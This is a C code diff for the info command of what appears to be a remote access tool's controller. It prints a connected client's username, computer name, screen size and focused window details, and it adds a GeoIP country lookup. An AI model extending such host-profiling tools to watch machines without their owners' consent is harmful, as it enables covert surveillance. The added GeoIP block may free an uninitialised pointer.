@@ -1,9 +1,12 @@
+#include <stdio.h>
 #include <stdlib.h>
 #include "types.h"
 #include "logger.h"
 #include "cmd/commands.h"
 #include "net/interface.h"
 #include "net/error.h"
+#include "geoIP.h"
+#include "server.h"
 
 #define COMMAND_INFO_USERNAME 0x10
 #define COMMAND_INFO_COMPUTERNAME 0x11
@@ -51,42 +54,96 @@ int command_Info(void)
 			{
 				if(rmsg[0] == COMMANDS_DISAPPROVE)
 				{
-					LOG(LOG_ERR, "Failed to get username!\n");
+					LOG(LOG_INFO, "Username: ");
+
+					if(log_Color)
+					{
+						LOG_plus_SetColor(log_colorPalette[LOG_COLOR_ERROR]);
+						puts("UNKNOWN");
+						LOG_plus_SetColor(log_colorPalette[LOG_COLOR_TEXT]);
+					}else{
+						puts("UNKNOWN");
+					}
 				}else{
 					LOG(LOG_INFO, "Username: %s\n", rmsg + 2);
 				}
 			}else if(rmsg[1] == COMMAND_INFO_COMPUTERNAME){
 				if(rmsg[0] == COMMANDS_DISAPPROVE)
 				{
-					LOG(LOG_ERR, "Failed to get computername!\n");
+					LOG(LOG_INFO, "Computername: ");
+					
+					if(log_Color)
+					{
+						LOG_plus_SetColor(log_colorPalette[LOG_COLOR_ERROR]);
+						puts("UNKNOWN");
+						LOG_plus_SetColor(log_colorPalette[LOG_COLOR_TEXT]);
+					}else{
+						puts("UNKNOWN");
+					}
 				}else{
 					LOG(LOG_INFO, "Computername: %s\n", rmsg + 2);
 				}
 			}else if(rmsg[1] == COMMAND_INFO_SC_WIDTH){
 				if(rmsg[0] == COMMANDS_DISAPPROVE)
 				{
-					LOG(LOG_ERR, "Failed to get screen width!\n");
+					LOG(LOG_INFO, "Screen width: ");
+					
+					if(log_Color)
+					{
+						LOG_plus_SetColor(log_colorPalette[LOG_COLOR_ERROR]);
+						puts("UNKNOWN");
+						LOG_plus_SetColor(log_colorPalette[LOG_COLOR_TEXT]);
+					}else{
+						puts("UNKNOWN");
+					}
 				}else{
 					LOG(LOG_INFO, "Screen width: %s\n", rmsg + 2);
 				}
 			}else if(rmsg[1] == COMMAND_INFO_SC_HEIGHT){
 				if(rmsg[0] == COMMANDS_DISAPPROVE)
 				{
-					LOG(LOG_ERR, "Failed to get screen height!\n");
+					LOG(LOG_INFO, "Screen height: ");
+					
+					if(log_Color)
+					{
+						LOG_plus_SetColor(log_colorPalette[LOG_COLOR_ERROR]);
+						puts("UNKNOWN");
+						LOG_plus_SetColor(log_colorPalette[LOG_COLOR_TEXT]);
+					}else{
+						puts("UNKNOWN");
+					}
 				}else{
 					LOG(LOG_INFO, "Screen height: %s\n", rmsg + 2);
 				}
 			}else if(rmsg[1] == COMMAND_INFO_FW_PID){
 				if(rmsg[0] == COMMANDS_DISAPPROVE)
 				{
-					LOG(LOG_ERR, "Failed to get focused window pid!\n");
+					LOG(LOG_INFO, "Focused window pid: ");
+					
+					if(log_Color)
+					{
+						LOG_plus_SetColor(log_colorPalette[LOG_COLOR_ERROR]);
+						puts("UNKNOWN");
+						LOG_plus_SetColor(log_colorPalette[LOG_COLOR_TEXT]);
+					}else{
+						puts("UNKNOWN");
+					}
 				}else{
 					LOG(LOG_INFO, "Focused window pid: %s\n", rmsg + 2);
 				}
 			}else if(rmsg[1] == COMMAND_INFO_FW_TITLE){
 				if(rmsg[0] == COMMANDS_DISAPPROVE)
 				{
-					LOG(LOG_ERR, "Failed to get focused window title!\n");
+					LOG(LOG_INFO, "Focused window title: ");
+					
+					if(log_Color)
+					{
+						LOG_plus_SetColor(log_colorPalette[LOG_COLOR_ERROR]);
+						puts("UNKNOWN");
+						LOG_plus_SetColor(log_colorPalette[LOG_COLOR_TEXT]);
+					}else{
+						puts("UNKNOWN");
+					}
 				}else{
 					LOG(LOG_INFO, "Focused window title: %s\n", rmsg + 2);
 				}
@@ -102,6 +159,29 @@ int command_Info(void)
 		}
 
 		free(rmsg);
+	}
+
+	if(geoIP_IsInUse)
+	{
+		LOG(LOG_INFO, "Geo: ");
+
+		char* country;
+
+		if(geoIP_CheckIP(inet_ntoa(server_ClientAddr.sin_addr), &country) != GEOIP_NO_ERROR)
+		{
+			if(log_Color)
+			{
+				LOG_plus_SetColor(log_colorPalette[LOG_COLOR_ERROR]);
+				puts("UNKNOWN");
+				LOG_plus_SetColor(log_colorPalette[LOG_COLOR_TEXT]);
+			}else{
+				puts("UNKNOWN");
+			}
+		}else{
+			puts(country);
+		}
+
+		free(country);
 	}
 
 	return COMMANDS_SUCC;
